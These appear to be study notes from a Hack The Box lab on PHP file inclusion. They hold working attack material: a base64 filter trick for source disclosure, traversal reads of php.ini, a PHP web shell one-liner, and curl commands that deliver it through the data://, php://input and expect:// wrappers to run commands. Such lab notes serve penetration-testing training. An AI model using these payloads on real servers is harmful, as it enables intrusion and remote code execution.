PHP Wrappers are used to access different I/O streams at the application level like standard input/output, file descriptors and memory streams.

# PHP Filters

## Input Filters

PHP filters are type of PHP wrappers which can be used to filter input with the filter we specify, we can access the PHP filter wrapper with `php://filter/`.

The main parameters we will use are the 'resource' parameter which can be used to specify the streams to apply the filters on and is required, and the 'read' parameter can apply different filters on the input resource.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php), the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

## Fuzzing for PHP Files

Fuzzing for available PHP pages:
```shell-session
Wildland4958@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

We can scan for all response code even 403 and still be able to read the source code.

We can than search for other referenced PHP files.

## Standard PHP Inclusion

This technique is mostly useful when the function appends `.php` extension at the end, When we get a PHP file that is executed and rendered instead of showing as html, we can use the base64 PHP filter to get the contents of the source code as base64.

## Source Code Disclosure

Read the source code of config:
```url
php://filter/read=convert.base64-encode/resource=config
```

# PHP Wrappers

## Data

### Checking PHP Configuration

The data wrapper can be used to include external data only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations.

The PHP configuration file location is (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, x.y is the version (we can start from top to bottom) and use base64 filter, it's also adviced to use burp or cURL for this:
```shell-session
Wildland4958@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<version>/apache2/php.ini"
```

Decode the configuration and find the `allow_rul_include` setting:
```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

### Remote Code Execution

Base64 encode a basic PHP web shell:
```shell-session
Wildland4958@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64
```

Now URL encode the string and pass it to the data wrapper with `data://text/plain;base64,`.

We can use cURL for this:
```shell-session
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

## Input

Like the data wrapper but we pass it as a post request data, so the vulnerable parameter must accept post for this attack to work.

cURL command:
```shell-session
Wildland4958@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

## Expect

This wrapper allows us to directly run commands trough URL streams, this is external wrapper so it needs to be manually installed on the back-end server.

We can check id it enabled in a similar check for `allow_url_include` but looking for the expect setting instead:
```shell-session
Wildland4958@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

Using the expect module with cURL:
```shell-session
Wildland4958@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```